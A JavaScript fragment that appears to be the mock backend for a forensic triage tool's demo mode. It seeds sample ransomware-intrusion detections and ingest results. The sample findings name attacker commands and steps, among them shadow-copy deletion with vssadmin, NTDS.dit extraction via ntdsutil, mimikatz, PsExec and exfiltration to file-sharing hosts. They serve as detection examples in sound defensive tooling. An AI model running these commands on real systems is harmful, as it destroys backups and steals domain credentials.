  if (cmd === "add_label") { if (!SAMPLE_LABELS.some((l) => l.event_id === args.eventId && l.tag === args.tag)) SAMPLE_LABELS.push({ event_id: args.eventId, tag: args.tag }); return Promise.resolve(); }
  if (cmd === "remove_label") { const i = SAMPLE_LABELS.findIndex((l) => l.event_id === args.eventId && l.tag === args.tag); if (i >= 0) SAMPLE_LABELS.splice(i, 1); return Promise.resolve(); }
  if (cmd === "ioc_preview") {
    const lines = (args.text || "").split(/\r?\n/).map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
    return Promise.resolve({ total: lines.length, by_kind: lines.length ? { "mixed (preview)": lines.length } : {}, skipped: 0 });
  }
  if (cmd === "ioc_sweep") {
    const lines = (args.text || "").split(/\r?\n/).map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
    SAMPLE_KV.ioc = args.text;
    return Promise.resolve(SAMPLE_KV.iocResults = { iocs: lines.length, matched: Math.min(2, lines.length), events_scanned: 4217, skipped: [],
      results: lines.map((v, i) => ({ value: v, kind: "text", kind_label: "text", events: i < 2 ? 3 - i : 0,
        first_seen: i < 2 ? "2026-02-11T02:14:00" : null, last_seen: i < 2 ? "2026-02-11T02:31:00" : null,
        artefacts: i < 2 ? { Evtx: 2, Mft: 1 - i } : {} })) });
  }
  if (cmd === "export_counts") { return Promise.resolve({ validated: 1, unconfirmed: sampleDetections().length - 1, false_positive: 0, dismissed: 0 }); }
  if (cmd === "ingest_log") { return Promise.resolve([
    ...(hasDC() ? [{ source_path: "C/Windows/NTDS/ntds.dit", artefact_kind: "Unclassified", status: "unsupported", detail: "no parser for this artefact kind", records_read: 0, events_emitted: 0, warning_count: 0, host: HN.dc },
      { source_path: "C/Windows/System32/winevt/Logs/Security.evtx", artefact_kind: "Evtx", status: "parsed", detail: null, records_read: 905, events_emitted: 905, warning_count: 0, host: HN.dc }] : []),
    { source_path: "C/Windows/System32/winevt/Logs/Security.evtx", artefact_kind: "Evtx", status: "parsed", detail: null, records_read: 4217, events_emitted: 4217, warning_count: 0, host: HN.wk },
    { source_path: "C/Windows/System32/config/SOFTWARE.LOG1", artefact_kind: "Unclassified", status: "applied", detail: "transaction log replayed into SOFTWARE", records_read: 0, events_emitted: 0, warning_count: 0, host: HN.wk },
    { source_path: "C/Windows/System32/config/SYSTEM.LOG2", artefact_kind: "Unclassified", status: "applied", detail: "transaction log replayed into SYSTEM", records_read: 0, events_emitted: 0, warning_count: 0, host: HN.wk },
    { source_path: "C/Windows/System32/config/BBI.LOG1", artefact_kind: "Unclassified", status: "unsupported", detail: "transaction log, but its hive (bbi) isn't in the collection", records_read: 0, events_emitted: 0, warning_count: 0, host: HN.wk },
    { source_path: "C/$MFT", artefact_kind: "Mft", status: "parsed", detail: null, records_read: 1051, events_emitted: 1051, warning_count: 3, host: HN.wk },
    { source_path: "C/Windows/Prefetch/README.txt", artefact_kind: "Unclassified", status: "unsupported", detail: "no parser for this artefact kind", records_read: 0, events_emitted: 0, warning_count: 0, host: HN.wk },
    { source_path: "C/corrupt/SOFTWARE", artefact_kind: "RegistryGeneric", status: "failed", detail: "notatin: unexpected end of hive bin at offset 0x4000", records_read: 0, events_emitted: 0, warning_count: 0, host: HN.wk },
  ].filter((r) => !args.host || r.host === args.host)); }
  // Browser preview: no lateral movement in the sample case.
  if (cmd === "lateral_movement") return Promise.resolve([]);
  if (cmd === "daily_activity") {
    const d = demoDailyActivity(), dc = hasDC();
    if (!dc || !args.host) return Promise.resolve(dc ? d.map((x) => ({ ...x, total: x.total + Math.round(x.total * 0.4) })) : d);
    if (args.host === HN.dc) return Promise.resolve(d.map((x) => ({ ...x, total: Math.round(x.total * 0.4), flagged: x.flagged ? 5 : 0 })));
    return Promise.resolve(d);
  }
  if (cmd === "list_triage") { return Promise.resolve(DEMO_TRIAGE); }
  if (cmd === "set_triage") {
    DEMO_TRIAGE = DEMO_TRIAGE.filter((t) => t.event_id !== args.eventId);
    const e = SEED.find((x) => x.id === args.eventId) || {};
    DEMO_TRIAGE.push({ event_id: args.eventId, triage_state: args.triageState, note: args.note || null, ts: (e.ts || "").replace("Z", ""), host: e.host || null, message: e.message || "" });
    return Promise.resolve(null);
  }
  if (cmd === "clear_triage") {
    DEMO_TRIAGE = DEMO_TRIAGE.filter((t) => t.event_id !== args.eventId);
    return Promise.resolve(null);
  }
  return Promise.resolve(null);
}

// In-memory triage store for demo mode.
let DEMO_TRIAGE = [];

// Demo-mode activity graph: a quiet baseline with one unmistakable spike on the
// intrusion day, so the feature is visible without a real case. The spike day
// carries the SEED events (a handful flagged); the baseline days are unflagged
// background noise — exactly the "normal 100, suddenly 1000" shape.
function demoDailyActivity() {
  const spikeDay = (SEED[0] && SEED[0].ts ? SEED[0].ts : "2026-02-11T00:00:00Z").slice(0, 10);
  const base = new Date(spikeDay + "T00:00:00Z");
  const flaggedOnSpike = SEED.filter((e) => e.flagged).length;
  const out = [];
  // 13 quiet days before the spike, then the spike, then 3 quieter days after.
  const shape = [92, 110, 88, 101, 97, 120, 84, 99, 108, 90, 115, 95, 103, 1000, 140, 96, 88];
  for (let i = 0; i < shape.length; i++) {
    const d = new Date(base.getTime() + (i - 13) * 86400000);
    const day = d.toISOString().slice(0, 10);
    const isSpike = i === 13;
    out.push({
      day,
      total: isSpike ? Math.max(shape[i], SEED.length) : shape[i],
      flagged: isSpike ? flaggedOnSpike : 0,
    });
  }
  return out;
}

// Detections the shipped rule pack would produce against the sample intrusion.
// In-memory stand-ins for the demo/browser preview.
const SAMPLE_KV = {};
const SAMPLE_LABELS = [];
const SAMPLE_SIGMA_DETS = [];
const DEMO_ALLOW = [];
// Demo version of the store's allow-list: split findings into live / suppressed.
function demoApplyAllow() {
  const all = sampleDetections().concat(SAMPLE_SIGMA_DETS), live = [], suppressed = [];
  for (const d of all) {
    const e = DEMO_ALLOW.find((a) => (a.rule_id === "*" || a.rule_id === d.rule_id) && a.contains.trim() &&
      String(d.summary).toLowerCase().includes(a.contains.trim().toLowerCase()));
    if (e) suppressed.push({ allow_id: e.id, rule_id: d.rule_id, title: d.title, severity: d.severity, summary: d.summary, ts: d.ts, engine: d.engine });
    else live.push(d);
  }
  return { live, suppressed };
}

function sampleDetections() {
  // Link each demo finding to a real SEED event (by message substring) so
  // clicking a finding opens that event — mirroring the real backend.
  const findId = (sub) => { const e = SEED.find((x) => (x.message || "").toLowerCase().includes(sub.toLowerCase())); return e ? [e.id] : []; };
  return [
    { rule_id: "srum_bulk_exfil", title: "Large outbound transfer (possible exfiltration)",
      severity: "high", attack: ["T1048","T1567"], engine: "correlation",
      summary: "Large outbound transfer: aggregate 4.5 GB over group upd.exe",
      event_ids: findId("SRUM net"), ts: T(2,17,20), host: HOST },
    { rule_id: "system_binary_masquerade", title: "System binary at non-System32 path (masquerade)",
      severity: "high", attack: ["T1036.005"], engine: "single_event",
      summary: "System binary masquerade: c:\\windows\\temp\\svchost.exe",
      event_ids: findId("MASQUERADE"), ts: T(2,19,0), host: HOST },
    { rule_id: "offensive_tooling", title: "Known offensive / lateral-movement tooling",
      severity: "high", attack: ["T1003","T1021.002","T1567.002"], engine: "single_event",
      summary: "Offensive tooling: c:\\users\\public\\mimikatz.exe",
      event_ids: findId("mimikatz"), ts: T(2,15,2), host: HOST },
    { rule_id: "rdp_then_tooling", title: "RDP logon followed by tooling activity",
      severity: "high", attack: ["T1021.001"], engine: "correlation",
      summary: "Sequential activity correlated on WKSTN-07",
      event_ids: findId("logon (type 10)"), ts: T(2,14,3), host: HOST },
    { rule_id: "mass_rename_ransomware", title: "Mass file rename burst (ransomware encryption)",
      severity: "critical", attack: ["T1486"], engine: "correlation",
      summary: "312 file renames in a tight window (group: WKSTN-07)",
      event_ids: [], ts: T(2,22,31), host: HOST },
    { rule_id: "ioc_fin_imp_006", title: "Ransomware leak-site or negotiation portal visit",
      severity: "critical", attack: ["T1657"], engine: "single_event",
      summary: "Leak-site visit: lockbitblog.example.onion",
      event_ids: [], ts: T(2,45,2), host: HOST },
    { rule_id: "ioc_fin_init_002", title: "Download from ephemeral / abused file-sharing host",
      severity: "high", attack: ["T1189"], engine: "single_event",
      summary: "Payload download from cdn.discordapp.com",
      event_ids: [], ts: T(2,10,5), host: HOST },
    { rule_id: "ioc_fin_exfil_002", title: "Web-based exfiltration service visited",
      severity: "high", attack: ["T1567"], engine: "single_event",
      summary: "Upload service visited: gofile.io",
      event_ids: [], ts: T(2,44,0), host: HOST },
  ].map((d) => ({ ...d, host: d.host === HOST ? HN.wk : d.host }))
   .concat(hasDC() ? [
    { rule_id: "psexec_service_install", title: "PsExec service installed (remote execution)",
      severity: "high", attack: ["T1021.002", "T1569.002"], engine: "single_event",
      summary: "Service PSEXESVC installed by svc_backup", event_ids: findId("PSEXESVC (C:"), ts: T(2,20,44), host: HN.dc },
    { rule_id: "ntds_extraction", title: "Active Directory database copied (NTDS.dit)",
      severity: "critical", attack: ["T1003.003"], engine: "single_event",
      summary: "ntdsutil IFM: create full C:\\ProgramData\\ifm", event_ids: findId("ntdsutil"), ts: T(2,21,10), host: HN.dc },
    { rule_id: "shadow_copy_delete", title: "Volume shadow copies deleted",
      severity: "critical", attack: ["T1490"], engine: "single_event",
      summary: "vssadmin delete shadows /all /quiet", event_ids: findId("vssadmin"), ts: T(2,23,2), host: HN.dc },
    { rule_id: "ioc:ipv4:10.20.4.37", title: "IOC match: 10.20.4.37 (IPv4)", severity: "high", attack: [], engine: "ioc",
      summary: "1 event · Evtx 1", event_ids: findId("from 10.20.4.37"), ts: T(2,20,41), host: HN.dc },
   ] : [])
   .sort((a,b) => sevRank(b.severity) - sevRank(a.severity));
}
function sevRank(s){ return {informational:1,low:2,medium:3,high:4,critical:5}[s]||0; }

function applyFilter(rows, f = {}) {
  let out = rows;
  if (f.text) { const q = f.text.toLowerCase();
    out = out.filter((e) => (e.message || "").toLowerCase().includes(q) || (e.user||"").toLowerCase().includes(q)); }
  if (f.ioc) { const q = String(f.ioc).toLowerCase();
    out = out.filter((e) => (e.message || "").toLowerCase().includes(q)); }
  if (f.host) out = out.filter((e) => e.host === f.host);
  if (f.kind) out = out.filter((e) => e.ts_kind === f.kind);
  if (f.label) { const ids = new Set(SAMPLE_LABELS.filter((l) => l.tag === f.label).map((l) => l.event_id)); out = out.filter((e) => ids.has(e.id)); }
  if (f.triage) { const ids = new Set(DEMO_TRIAGE.filter((t) => t.triage_state === f.triage).map((t) => t.event_id)); out = out.filter((e) => ids.has(e.id)); }
  if (f.user) out = out.filter((e) => e.user === f.user);
  if (f.artefact) out = out.filter((e) => e.artefact === f.artefact);
  if (f.category) out = out.filter((e) => e.category === f.category);
  if (f.flagged_only) out = out.filter((e) => e.flagged);
  const off = f.offset || 0, lim = f.limit || 1000;
  return out.slice(off, off + lim);
}

function overview(host) {
  const by = {}, rows = scopeRows(host);
  rows.forEach((e) => (by[e.artefact] = (by[e.artefact] || 0) + 1));
  return {
    case_id: "c0ffee00-1a2b-4c3d-8e9f-000000000001",
    total_events: rows.length,
    by_artefact: Object.entries(by).map(([label, count]) => ({ label, count })).sort((a,b)=>b.count-a.count),
    by_category: ["execution", "persistence", "filesystem", "network", "logon"].map((c) => ({ label: c, count: rows.filter((e) => e.category === c).length })),
    ingest: [{ label: "parsed", count: 11 }, { label: "unsupported", count: 2 }, { label: "failed", count: 0 }],
    srum_top_talkers: host && host === HN.dc ? [] : [
      { app: "c:\\programdata\\upd.exe", user: "S-1-5-21…-1013", bytes_sent: 4831838208, bytes_recv: 20551 },
      { app: "OUTLOOK.EXE", user: "S-1-5-21…-1013", bytes_sent: 88214400, bytes_recv: 149423616 },
      { app: "chrome.exe", user: "S-1-5-21…-1013", bytes_sent: 41205760, bytes_recv: 620494848 },
      { app: "teams.exe", user: "S-1-5-21…-1013", bytes_sent: 15728640, bytes_recv: 83886080 },
    ],
  };
}

function rawFor(e) {
  return { artefact: e.artefact, action: e.action, timestamp: e.ts, timestamp_kind: e.ts_kind,
    host: e.host, user: e.user, message: e.message,
    provenance: { parser: e.artefact.toLowerCase(), source_path: `triage/${e.artefact}`, note: "sample data — no real evidence" },
    flagged: e.flagged, tag: e._tag, ...(e._raw ? { event_data: e._raw } : {}), ...(e._rawTop || {}) };
}
